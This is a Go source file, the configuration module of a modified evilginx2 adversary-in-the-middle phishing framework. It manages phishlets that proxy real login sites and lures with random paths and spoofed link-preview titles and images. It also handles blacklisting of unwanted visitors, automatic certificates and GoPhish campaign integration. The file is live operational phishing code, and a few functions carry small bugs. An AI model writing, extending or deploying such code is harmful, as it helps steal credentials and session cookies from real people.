package core

import (
	"fmt"
	"net/url"
	"os"
	"path/filepath"
	"strings"

	"github.com/kgretzky/evilginx2/log"

	"strconv"

	"math/rand"
	"time"

	"github.com/spf13/viper"
)

var BLACKLIST_MODES = []string{"all", "unauth", "noadd", "off"}

type Lure struct {
	Id              string `mapstructure:"id" json:"id" yaml:"id"`
	Hostname        string `mapstructure:"hostname" json:"hostname" yaml:"hostname"`
	Path            string `mapstructure:"path" json:"path" yaml:"path"`
	RedirectUrl     string `mapstructure:"redirect_url" json:"redirect_url" yaml:"redirect_url"`
	Phishlet        string `mapstructure:"phishlet" json:"phishlet" yaml:"phishlet"`
	Redirector      string `mapstructure:"redirector" json:"redirector" yaml:"redirector"`
	UserAgentFilter string `mapstructure:"ua_filter" json:"ua_filter" yaml:"ua_filter"`
	Info            string `mapstructure:"info" json:"info" yaml:"info"`
	OgTitle         string `mapstructure:"og_title" json:"og_title" yaml:"og_title"`
	OgDescription   string `mapstructure:"og_desc" json:"og_desc" yaml:"og_desc"`
	OgImageUrl      string `mapstructure:"og_image" json:"og_image" yaml:"og_image"`
	OgUrl           string `mapstructure:"og_url" json:"og_url" yaml:"og_url"`
	PausedUntil     int64  `mapstructure:"paused" json:"paused" yaml:"paused"`
}

type SubPhishlet struct {
	Name       string            `mapstructure:"name" json:"name" yaml:"name"`
	ParentName string            `mapstructure:"parent_name" json:"parent_name" yaml:"parent_name"`
	Params     map[string]string `mapstructure:"params" json:"params" yaml:"params"`
}

type PhishletConfig struct {
	Hostname  string `mapstructure:"hostname" json:"hostname" yaml:"hostname"`
	UnauthUrl string `mapstructure:"unauth_url" json:"unauth_url" yaml:"unauth_url"`
	Enabled   bool   `mapstructure:"enabled" json:"enabled" yaml:"enabled"`
	Visible   bool   `mapstructure:"visible" json:"visible" yaml:"visible"`
}

type ProxyConfig struct {
	Type     string `mapstructure:"type" json:"type" yaml:"type"`
	Address  string `mapstructure:"address" json:"address" yaml:"address"`
	Port     int    `mapstructure:"port" json:"port" yaml:"port"`
	Username string `mapstructure:"username" json:"username" yaml:"username"`
	Password string `mapstructure:"password" json:"password" yaml:"password"`
	Enabled  bool   `mapstructure:"enabled" json:"enabled" yaml:"enabled"`
}

type BlacklistConfig struct {
	Mode string `mapstructure:"mode" json:"mode" yaml:"mode"`
}

type CertificatesConfig struct {
}

type GoPhishConfig struct {
	AdminUrl    string `mapstructure:"admin_url" json:"admin_url" yaml:"admin_url"`
	ApiKey      string `mapstructure:"api_key" json:"api_key" yaml:"api_key"`
	InsecureTLS bool   `mapstructure:"insecure" json:"insecure" yaml:"insecure"`
}

type GeneralConfig struct {
	Domain       string `mapstructure:"domain" json:"domain" yaml:"domain"`
	OldIpv4      string `mapstructure:"ipv4" json:"ipv4" yaml:"ipv4"`
	ExternalIpv4 string `mapstructure:"external_ipv4" json:"external_ipv4" yaml:"external_ipv4"`
	BindIpv4     string `mapstructure:"bind_ipv4" json:"bind_ipv4" yaml:"bind_ipv4"`
	UnauthUrl    string `mapstructure:"unauth_url" json:"unauth_url" yaml:"unauth_url"`
	HttpsPort    int    `mapstructure:"https_port" json:"https_port" yaml:"https_port"`
	DnsPort      int    `mapstructure:"dns_port" json:"dns_port" yaml:"dns_port"`
	Autocert     bool   `mapstructure:"autocert" json:"autocert" yaml:"autocert"`
}

type Config struct {
	general         *GeneralConfig
	certificates    *CertificatesConfig
	blacklistConfig *BlacklistConfig
	gophishConfig   *GoPhishConfig
	proxyConfig     *ProxyConfig
	phishletConfig  map[string]*PhishletConfig
	phishlets       map[string]*Phishlet
	phishletNames   []string
	activeHostnames []string
	redirectorsDir  string
	lures           []*Lure
	lureIds         []string
	subphishlets    []*SubPhishlet
	cfg             *viper.Viper
	lureCounter     int
}

const (
	CFG_GENERAL      = "general"
	CFG_CERTIFICATES = "certificates"
	CFG_LURES        = "lures"
	CFG_PROXY        = "proxy"
	CFG_PHISHLETS    = "phishlets"
	CFG_BLACKLIST    = "blacklist"
	CFG_SUBPHISHLETS = "subphishlets"
	CFG_GOPHISH      = "gophish"
)

const DEFAULT_UNAUTH_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ" // Rick'roll

func NewConfig(cfg_dir string, path string) (*Config, error) {
	c := &Config{
		general:         &GeneralConfig{},
		certificates:    &CertificatesConfig{},
		gophishConfig:   &GoPhishConfig{},
		phishletConfig:  make(map[string]*PhishletConfig),
		phishlets:       make(map[string]*Phishlet),
		phishletNames:   []string{},
		lures:           []*Lure{},
		blacklistConfig: &BlacklistConfig{},
	}

	c.cfg = viper.New()
	c.cfg.SetConfigType("json")

	if path == "" {

		path = filepath.Join(cfg_dir, "config.json")

	}
	err := os.MkdirAll(filepath.Dir(path), os.FileMode(0700))
	if err != nil {
		return nil, err
	}
	var created_cfg bool = false
	c.cfg.SetConfigFile(path)
	if _, err := os.Stat(path); os.IsNotExist(err) {
		created_cfg = true
		err = c.cfg.WriteConfigAs(path)
		if err != nil {
			return nil, err
		}
	}

	err = c.cfg.ReadInConfig()
	if err != nil {
		return nil, err
	}

	c.cfg.UnmarshalKey(CFG_GENERAL, &c.general)
	if c.cfg.Get("general.autocert") == nil {
		c.cfg.Set("general.autocert", true)
		c.general.Autocert = true
	}

	// 读取 lureCounter，如果不存在则默认为 0
	c.lureCounter = c.cfg.GetInt("lure_counter")

	c.cfg.UnmarshalKey(CFG_BLACKLIST, &c.blacklistConfig)

	c.cfg.UnmarshalKey(CFG_GOPHISH, &c.gophishConfig)

	if c.general.OldIpv4 != "" {
		if c.general.ExternalIpv4 == "" {
			c.SetServerExternalIP(c.general.OldIpv4)
		}
		c.SetServerIP("")
	}

	if !stringExists(c.blacklistConfig.Mode, BLACKLIST_MODES) {
		c.SetBlacklistMode("unauth")
	}

	if c.general.UnauthUrl == "" && created_cfg {
		c.SetUnauthUrl(DEFAULT_UNAUTH_URL)
	}
	if c.general.HttpsPort == 0 {
		c.SetHttpsPort(443)
	}
	if c.general.DnsPort == 0 {
		c.SetDnsPort(53)
	}
	if created_cfg {
		c.EnableAutocert(true)
	}

	c.lures = []*Lure{}
	c.cfg.UnmarshalKey(CFG_LURES, &c.lures)
	c.proxyConfig = &ProxyConfig{}
	c.cfg.UnmarshalKey(CFG_PROXY, &c.proxyConfig)
	c.cfg.UnmarshalKey(CFG_PHISHLETS, &c.phishletConfig)
	c.cfg.UnmarshalKey(CFG_CERTIFICATES, &c.certificates)

	for i := 0; i < len(c.lures); i++ {
		c.lureIds = append(c.lureIds, GenRandomToken())
	}

	c.cfg.WriteConfig()
	return c, nil
}

func (c *Config) PhishletConfig(site string) *PhishletConfig {
	if o, ok := c.phishletConfig[site]; ok {
		return o
	} else {
		o := &PhishletConfig{
			Hostname:  "",
			UnauthUrl: "",
			Enabled:   false,
			Visible:   true,
		}
		c.phishletConfig[site] = o
		return o
	}
}

func (c *Config) SavePhishlets() {
	c.cfg.Set(CFG_PHISHLETS, c.phishletConfig)
	c.cfg.WriteConfig()
}

func (c *Config) SetSiteHostname(site string, hostname string) bool {
	if c.general.Domain == "" {
		log.Error("you need to set server top-level domain, first. type: server your-domain.com")
		return false
	}
	pl, err := c.GetPhishlet(site)
	if err != nil {
		log.Error("%v", err)
		return false
	}
	if pl.isTemplate {
		log.Error("phishlet is a template - can't set hostname")
		return false
	}
	if hostname != "" && hostname != c.general.Domain && !strings.HasSuffix(hostname, "."+c.general.Domain) {
		log.Error("phishlet hostname must end with '%s'", c.general.Domain)
		return false
	}
	log.Info("phishlet '%s' hostname set to: %s", site, hostname)
	c.PhishletConfig(site).Hostname = hostname
	c.SavePhishlets()
	return true
}

func (c *Config) SetSiteUnauthUrl(site string, _url string) bool {
	pl, err := c.GetPhishlet(site)
	if err != nil {
		log.Error("%v", err)
		return false
	}
	if pl.isTemplate {
		log.Error("phishlet is a template - can't set unauth_url")
		return false
	}
	if _url != "" {
		_, err := url.ParseRequestURI(_url)
		if err != nil {
			log.Error("invalid URL: %s", err)
			return false
		}
	}
	log.Info("phishlet '%s' unauth_url set to: %s", site, _url)
	c.PhishletConfig(site).UnauthUrl = _url
	c.SavePhishlets()
	return true
}

func (c *Config) SetBaseDomain(domain string) {
	c.general.Domain = domain
	c.cfg.Set(CFG_GENERAL, c.general)
	log.Info("server domain set to: %s", domain)
	c.cfg.WriteConfig()
}

func (c *Config) SetServerIP(ip_addr string) {
	c.general.OldIpv4 = ip_addr
	c.cfg.Set(CFG_GENERAL, c.general)
	//log.Info("server IP set to: %s", ip_addr)
	c.cfg.WriteConfig()
}

func (c *Config) SetServerExternalIP(ip_addr string) {
	c.general.ExternalIpv4 = ip_addr
	c.cfg.Set(CFG_GENERAL, c.general)
	log.Info("server external IP set to: %s", ip_addr)
	c.cfg.WriteConfig()
}

func (c *Config) SetServerBindIP(ip_addr string) {
	c.general.BindIpv4 = ip_addr
	c.cfg.Set(CFG_GENERAL, c.general)
	log.Info("server bind IP set to: %s", ip_addr)
	log.Warning("you may need to restart evilginx for the changes to take effect")
	c.cfg.WriteConfig()
}

func (c *Config) SetHttpsPort(port int) {
	c.general.HttpsPort = port
	c.cfg.Set(CFG_GENERAL, c.general)
	log.Info("https port set to: %d", port)
	c.cfg.WriteConfig()
}

func (c *Config) SetDnsPort(port int) {
	c.general.DnsPort = port
	c.cfg.Set(CFG_GENERAL, c.general)
	log.Info("dns port set to: %d", port)
	c.cfg.WriteConfig()
}

func (c *Config) EnableProxy(enabled bool) {
	c.proxyConfig.Enabled = enabled
	c.cfg.Set(CFG_PROXY, c.proxyConfig)
	if enabled {
		log.Info("enabled proxy")
	} else {
		log.Info("disabled proxy")
	}
	c.cfg.WriteConfig()
}

func (c *Config) SetProxyType(ptype string) {
	ptypes := []string{"http", "https", "socks5", "socks5h"}
	if !stringExists(ptype, ptypes) {
		log.Error("invalid proxy type selected")
		return
	}
	c.proxyConfig.Type = ptype
	c.cfg.Set(CFG_PROXY, c.proxyConfig)
	log.Info("proxy type set to: %s", ptype)
	c.cfg.WriteConfig()
}

func (c *Config) SetProxyAddress(address string) {
	c.proxyConfig.Address = address
	c.cfg.Set(CFG_PROXY, c.proxyConfig)
	log.Info("proxy address set to: %s", address)
	c.cfg.WriteConfig()
}

func (c *Config) SetProxyPort(port int) {
	c.proxyConfig.Port = port
	c.cfg.Set(CFG_PROXY, c.proxyConfig.Port)
	log.Info("proxy port set to: %d", port)
	c.cfg.WriteConfig()
}

func (c *Config) SetProxyUsername(username string) {
	c.proxyConfig.Username = username
	c.cfg.Set(CFG_PROXY, c.proxyConfig)
	log.Info("proxy username set to: %s", username)
	c.cfg.WriteConfig()
}

func (c *Config) SetProxyPassword(password string) {
	c.proxyConfig.Password = password
	c.cfg.Set(CFG_PROXY, c.proxyConfig)
	log.Info("proxy password set to: %s", password)
	c.cfg.WriteConfig()
}

func (c *Config) GetUnauthUrl() string {
	return c.general.UnauthUrl
}

func (c *Config) SetGoPhishAdminUrl(k string) {
	u, err := url.ParseRequestURI(k)
	if err != nil {
		log.Error("invalid url: %s", err)
		return
	}

	c.gophishConfig.AdminUrl = u.String()
	c.cfg.Set(CFG_GOPHISH, c.gophishConfig)
	log.Info("gophish admin url set to: %s", u.String())
	c.cfg.WriteConfig()
}

func (c *Config) SetGoPhishApiKey(k string) {
	c.gophishConfig.ApiKey = k
	c.cfg.Set(CFG_GOPHISH, c.gophishConfig)
	log.Info("gophish api key set to: %s", k)
	c.cfg.WriteConfig()
}

func (c *Config) SetGoPhishInsecureTLS(k bool) {
	c.gophishConfig.InsecureTLS = k
	c.cfg.Set(CFG_GOPHISH, c.gophishConfig)
	log.Info("gophish insecure set to: %v", k)
	c.cfg.WriteConfig()
}

func (c *Config) IsLureHostnameValid(hostname string) bool {
	for _, l := range c.lures {
		if l.Hostname == hostname {
			if c.PhishletConfig(l.Phishlet).Enabled {
				return true
			}
		}
	}
	return false
}

func (c *Config) SetSiteEnabled(site string) error {
	pl, err := c.GetPhishlet(site)
	if err != nil {
		log.Error("%v", err)
		return err
	}
	if c.PhishletConfig(site).Hostname == "" {
		return fmt.Errorf("enabling phishlet '%s' requires its hostname to be set up", site)
	}
	if pl.isTemplate {
		return fmt.Errorf("phishlet '%s' is a template - you have to 'create' child phishlet from it, with predefined parameters, before you can enable it.", site)
	}
	c.PhishletConfig(site).Enabled = true
	c.refreshActiveHostnames()
	c.VerifyPhishlets()
	log.Info("enabled phishlet '%s'", site)

	c.SavePhishlets()
	return nil
}

func (c *Config) SetSiteDisabled(site string) error {
	if _, err := c.GetPhishlet(site); err != nil {
		log.Error("%v", err)
		return err
	}
	c.PhishletConfig(site).Enabled = false
	c.refreshActiveHostnames()
	log.Info("disabled phishlet '%s'", site)

	c.SavePhishlets()
	return nil
}

func (c *Config) SetSiteHidden(site string, hide bool) error {
	if _, err := c.GetPhishlet(site); err != nil {
		log.Error("%v", err)
		return err
	}
	c.PhishletConfig(site).Visible = !hide
	c.refreshActiveHostnames()

	if hide {
		log.Info("phishlet '%s' is now hidden and all requests to it will be redirected", site)
	} else {
		log.Info("phishlet '%s' is now reachable and visible from the outside", site)
	}
	c.SavePhishlets()
	return nil
}

func (c *Config) SetRedirectorsDir(path string) {
	c.redirectorsDir = path
}

func (c *Config) ResetAllSites() {
	c.phishletConfig = make(map[string]*PhishletConfig)
	c.SavePhishlets()
}

func (c *Config) IsSiteEnabled(site string) bool {
	return c.PhishletConfig(site).Enabled
}

func (c *Config) IsSiteHidden(site string) bool {
	return !c.PhishletConfig(site).Visible
}

func (c *Config) GetEnabledSites() []string {
	var sites []string
	for k, o := range c.phishletConfig {
		if o.Enabled {
			sites = append(sites, k)
		}
	}
	return sites
}

func (c *Config) SetBlacklistMode(mode string) {
	if stringExists(mode, BLACKLIST_MODES) {
		c.blacklistConfig.Mode = mode
		c.cfg.Set(CFG_BLACKLIST, c.blacklistConfig)
		c.cfg.WriteConfig()
	}
	log.Info("blacklist mode set to: %s", mode)
}

func (c *Config) SetUnauthUrl(_url string) {
	c.general.UnauthUrl = _url
	c.cfg.Set(CFG_GENERAL, c.general)
	log.Info("unauthorized request redirection URL set to: %s", _url)
	c.cfg.WriteConfig()
}

func (c *Config) EnableAutocert(enabled bool) {
	c.general.Autocert = enabled
	if enabled {
		log.Info("autocert is now enabled")
	} else {
		log.Info("autocert is now disabled")
	}
	c.cfg.Set(CFG_GENERAL, c.general)
	c.cfg.WriteConfig()
}

func (c *Config) refreshActiveHostnames() {
	c.activeHostnames = []string{}
	sites := c.GetEnabledSites()
	for _, site := range sites {
		pl, err := c.GetPhishlet(site)
		if err != nil {
			continue
		}
		for _, host := range pl.GetPhishHosts(false) {
			c.activeHostnames = append(c.activeHostnames, strings.ToLower(host))
		}
	}
	for _, l := range c.lures {
		if stringExists(l.Phishlet, sites) {
			if l.Hostname != "" {
				c.activeHostnames = append(c.activeHostnames, strings.ToLower(l.Hostname))
			}
		}
	}
}

func (c *Config) GetActiveHostnames(site string) []string {
	var ret []string
	sites := c.GetEnabledSites()
	for _, _site := range sites {
		if site == "" || _site == site {
			pl, err := c.GetPhishlet(_site)
			if err != nil {
				continue
			}
			for _, host := range pl.GetPhishHosts(false) {
				ret = append(ret, strings.ToLower(host))
			}
		}
	}
	for _, l := range c.lures {
		if site == "" || l.Phishlet == site {
			if l.Hostname != "" {
				hostname := strings.ToLower(l.Hostname)
				ret = append(ret, hostname)
			}
		}
	}
	return ret
}

func (c *Config) IsActiveHostname(host string) bool {
	host = strings.ToLower(host)
	if host[len(host)-1:] == "." {
		host = host[:len(host)-1]
	}
	for _, h := range c.activeHostnames {
		if h == host {
			return true
		}
	}
	return false
}

func (c *Config) AddPhishlet(site string, pl *Phishlet) {
	c.phishletNames = append(c.phishletNames, site)
	c.phishlets[site] = pl
	c.VerifyPhishlets()
}

func (c *Config) AddSubPhishlet(site string, parent_site string, customParams map[string]string) error {
	pl, err := c.GetPhishlet(parent_site)
	if err != nil {
		return err
	}
	_, err = c.GetPhishlet(site)
	if err == nil {
		return fmt.Errorf("phishlet '%s' already exists", site)
	}
	sub_pl, err := NewPhishlet(site, pl.Path, &customParams, c)
	if err != nil {
		return err
	}
	sub_pl.ParentName = parent_site

	c.phishletNames = append(c.phishletNames, site)
	c.phishlets[site] = sub_pl
	c.VerifyPhishlets()

	return nil
}

func (c *Config) DeleteSubPhishlet(site string) error {
	pl, err := c.GetPhishlet(site)
	if err != nil {
		return err
	}
	if pl.ParentName == "" {
		return fmt.Errorf("phishlet '%s' can't be deleted - you can only delete child phishlets.", site)
	}

	c.phishletNames = removeString(site, c.phishletNames)
	delete(c.phishlets, site)
	delete(c.phishletConfig, site)
	c.SavePhishlets()
	return nil
}

func (c *Config) RemovePhishlet(site string) error {
	_, exists := c.phishlets[site]
	if !exists {
		return fmt.Errorf("phishlet '%s' does not exist", site)
	}

	// 从内存结构中删除
	delete(c.phishlets, site)
	delete(c.phishletConfig, site)

	// 从 phishletNames 数组中删除
	c.phishletNames = removeString(site, c.phishletNames)

	// 删除 YAML 文件
	path := fmt.Sprintf("./phishlets/%s.yaml", site)
	if err := os.Remove(path); err != nil {
		return fmt.Errorf("failed to remove file: %v", err)
	}

	// 保存更改
	c.SavePhishlets()

	log.Info("Phishlet '%s' removed", site)
	return nil
}

func (c *Config) LoadSubPhishlets() {
	var subphishlets []*SubPhishlet
	c.cfg.UnmarshalKey(CFG_SUBPHISHLETS, &subphishlets)
	for _, spl := range subphishlets {
		err := c.AddSubPhishlet(spl.Name, spl.ParentName, spl.Params)
		if err != nil {
			log.Error("phishlets: %s", err)
		}
	}
}

func (c *Config) SaveSubPhishlets() {
	var subphishlets []*SubPhishlet
	for _, pl := range c.phishlets {
		if pl.ParentName != "" {
			spl := &SubPhishlet{
				Name:       pl.Name,
				ParentName: pl.ParentName,
				Params:     pl.customParams,
			}
			subphishlets = append(subphishlets, spl)
		}
	}

	c.cfg.Set(CFG_SUBPHISHLETS, subphishlets)
	c.cfg.WriteConfig()
}

func (c *Config) VerifyPhishlets() {
	hosts := make(map[string]string)

	for site, pl := range c.phishlets {
		if pl.isTemplate {
			continue
		}
		for _, ph := range pl.proxyHosts {
			phish_host := combineHost(ph.phish_subdomain, ph.domain)
			orig_host := combineHost(ph.orig_subdomain, ph.domain)
			if c_site, ok := hosts[phish_host]; ok {
				log.Warning("phishlets: hostname '%s' collision between '%s' and '%s' phishlets", phish_host, site, c_site)
			} else if c_site, ok := hosts[orig_host]; ok {
				log.Warning("phishlets: hostname '%s' collision between '%s' and '%s' phishlets", orig_host, site, c_site)
			}
			hosts[phish_host] = site
			hosts[orig_host] = site
		}
	}
}

func (c *Config) CleanUp() {

	for k := range c.phishletConfig {
		_, err := c.GetPhishlet(k)
		if err != nil {
			delete(c.phishletConfig, k)
		}
	}
	c.SavePhishlets()
	/*
		var sites_enabled []string
		var sites_hidden []string
		for k := range c.siteDomains {
			_, err := c.GetPhishlet(k)
			if err != nil {
				delete(c.siteDomains, k)
			} else {
				if c.IsSiteEnabled(k) {
					sites_enabled = append(sites_enabled, k)
				}
				if c.IsSiteHidden(k) {
					sites_hidden = append(sites_hidden, k)
				}
			}
		}
		c.cfg.Set(CFG_SITE_DOMAINS, c.siteDomains)
		c.cfg.Set(CFG_SITES_ENABLED, sites_enabled)
		c.cfg.Set(CFG_SITES_HIDDEN, sites_hidden)
		c.cfg.WriteConfig()*/
}

func (c *Config) AddLure(site string, l *Lure) (int, string) {
	// 以当前 lures 数组长度作为新 lure 的索引
	index := len(c.lures)

	// 如果 l.Id 为空，则自动生成（这里使用顺序号作为 ID，可根据需要换成随机字符串）
	if l.Id == "" {
		l.Id = fmt.Sprintf("%d", index)
	}

	// 如果 l.Path 为空，则自动生成一个随机路径（假设 GenRandomToken() 返回一个字符串）
	if l.Path == "" {
		l.Path = "/" + GenRandomToken()
	}

	c.lures = append(c.lures, l)
	// 如果你不再单独需要 lureIds 数组，可以不用再保存；否则保留：
	// c.lureIds = append(c.lureIds, l.Id)
	c.cfg.Set(CFG_LURES, c.lures)
	c.cfg.WriteConfig()
	return index, l.Id
}

func (c *Config) SetLure(index int, l *Lure) error {
	if index >= 0 && index < len(c.lures) {
		c.lures[index] = l
	} else {
		return fmt.Errorf("index out of bounds: %d", index)
	}
	c.cfg.Set(CFG_LURES, c.lures)
	c.cfg.WriteConfig()
	return nil
}

// GetLureFullURL 根据 lure 的 path 和全局配置中的域名生成完整 URL
func (c *Config) GetLureFullURL(lure *Lure) string {
	baseDomain := c.GetBaseDomain() // 比如返回 "example.com"
	// 你可以根据需要决定使用 http 还是 https，这里假设使用 https
	// 假设 lure.Path 存储的是路由部分（例如 "abc123"）
	return fmt.Sprintf("https://%s/%s", baseDomain, lure.Path)
}

func (c *Config) DeleteLure(index int) error {
	if index >= 0 && index < len(c.lures) {
		c.lures = append(c.lures[:index], c.lures[index+1:]...)
		c.lureIds = append(c.lureIds[:index], c.lureIds[index+1:]...)
	} else {
		return fmt.Errorf("index out of bounds: %d", index)
	}
	c.cfg.Set(CFG_LURES, c.lures)
	c.cfg.WriteConfig()
	return nil
}

func (c *Config) DeleteLures(index []int) []int {
	tlures := []*Lure{}
	tlureIds := []string{}
	di := []int{}
	for n, l := range c.lures {
		if !intExists(n, index) {
			tlures = append(tlures, l)
			tlureIds = append(tlureIds, c.lureIds[n])
		} else {
			di = append(di, n)
		}
	}
	if len(di) > 0 {
		c.lures = tlures
		c.lureIds = tlureIds
		c.cfg.Set(CFG_LURES, c.lures)
		c.cfg.WriteConfig()
	}
	return di
}

// DeleteLureByID 根据 lure 的 ID 删除 lure
func (c *Config) DeleteLureByID(id int) error {
	idx := -1
	// 遍历 c.lures 找到 ID 匹配的 lure；注意 lure.Id 是字符串
	for i, l := range c.lures {
		if l.Id == strconv.Itoa(id) {
			idx = i
			break
		}
	}
	if idx == -1 {
		return fmt.Errorf("lure with ID %d not found", id)
	}
	// 删除指定下标的 lure
	c.lures = append(c.lures[:idx], c.lures[idx+1:]...)
	// 更新配置文件中的 lure 列表，假设配置中保存时使用的 key 为 "lures"
	c.cfg.Set("lures", c.lures)
	c.cfg.WriteConfig()
	return nil
}

// UpdateLureByID 根据传入的 ID 更新 lure 的信息
func (c *Config) UpdateLureByID(id int, partial *Lure) error {
	// 遍历所有 lure，不需要用到索引就用 _ 代替
	for _, l := range c.lures {
		if l.Id == strconv.Itoa(id) {
			// 更新需要修改的字段
			l.RedirectUrl = partial.RedirectUrl
			l.OgTitle = partial.OgTitle
			l.OgDescription = partial.OgDescription
			l.OgImageUrl = partial.OgImageUrl
			l.PausedUntil = partial.PausedUntil
			// 如果有其它字段需要更新，可在这里补充

			// 将更新后的 lure 列表写入配置
			c.cfg.Set("lures", c.lures)
			c.cfg.WriteConfig()
			return nil
		}
	}
	return fmt.Errorf("lure with ID %d not found", id)
}

func (c *Config) GetLure(index int) (*Lure, error) {
	if index >= 0 && index < len(c.lures) {
		return c.lures[index], nil
	} else {
		return nil, fmt.Errorf("index out of bounds: %d", index)
	}
}

func (c *Config) GetAllLures() []*Lure {
	return c.lures
}

func (c *Config) GetLureByPath(site string, host string, path string) (*Lure, error) {
	for _, l := range c.lures {
		if l.Phishlet == site {
			pl, err := c.GetPhishlet(site)
			if err == nil {
				if host == l.Hostname || host == pl.GetLandingPhishHost() {
					if l.Path == path {
						return l, nil
					}
				}
			}
		}
	}
	return nil, fmt.Errorf("lure for path '%s' not found", path)
}

// RandString 生成一个长度为 n 的随机字符串（只包含字母和数字）
func RandString(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	rand.Seed(time.Now().UnixNano())
	b := make([]byte, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

// AddLureAuto 根据传入的 phishlet 名称和部分 lure 数据，自动生成一个新的 lure，
// 自动生成 ID 和随机短路径，并将其加入配置中
func (c *Config) AddLureAuto(phishlet string, partial *Lure) (*Lure, error) {
	// 自增 lureCounter
	c.lureCounter++
	lureID := c.lureCounter

	// 自动生成一个6位随机短路径
	shortPath := "/" + RandString(6)

	newLure := &Lure{
		Id:            strconv.Itoa(lureID), // ID 为自增的数字字符串
		Phishlet:      phishlet,
		Path:          shortPath,
		RedirectUrl:   partial.RedirectUrl,
		OgTitle:       partial.OgTitle,
		OgDescription: partial.OgDescription,
		OgImageUrl:    partial.OgImageUrl,
		PausedUntil:   0, // 默认启用
	}

	// 将新 lure 添加到列表中
	c.lures = append(c.lures, newLure)
	// 将 lure 数组保存到配置（此处使用 "lures" 作为 key，你也可以定义一个常量）
	c.cfg.Set("lures", c.lures)
	// 同步更新 lureCounter 到配置文件
	c.cfg.Set("lure_counter", c.lureCounter)
	c.cfg.WriteConfig()

	return newLure, nil
}

func (c *Config) GetPhishlet(site string) (*Phishlet, error) {
	pl, ok := c.phishlets[site]
	if !ok {
		return nil, fmt.Errorf("phishlet '%s' not found", site)
	}
	return pl, nil
}

func (c *Config) GetPhishletNames() []string {
	return c.phishletNames
}

func (c *Config) GetSiteDomain(site string) (string, bool) {
	if o, ok := c.phishletConfig[site]; ok {
		return o.Hostname, ok
	}
	return "", false
}

func (c *Config) GetSiteUnauthUrl(site string) (string, bool) {
	if o, ok := c.phishletConfig[site]; ok {
		return o.UnauthUrl, ok
	}
	return "", false
}

func (c *Config) GetBaseDomain() string {
	return c.general.Domain
}

func (c *Config) GetServerExternalIP() string {
	return c.general.ExternalIpv4
}

func (c *Config) GetServerBindIP() string {
	return c.general.BindIpv4
}

func (c *Config) GetHttpsPort() int {
	return c.general.HttpsPort
}

func (c *Config) GetDnsPort() int {
	return c.general.DnsPort
}

func (c *Config) GetRedirectorsDir() string {
	return c.redirectorsDir
}

func (c *Config) GetBlacklistMode() string {
	return c.blacklistConfig.Mode
}

func (c *Config) IsAutocertEnabled() bool {
	return c.general.Autocert
}

func (c *Config) GetGoPhishAdminUrl() string {
	return c.gophishConfig.AdminUrl
}

func (c *Config) GetGoPhishApiKey() string {
	return c.gophishConfig.ApiKey
}

func (c *Config) GetGoPhishInsecureTLS() bool {
	return c.gophishConfig.InsecureTLS
}
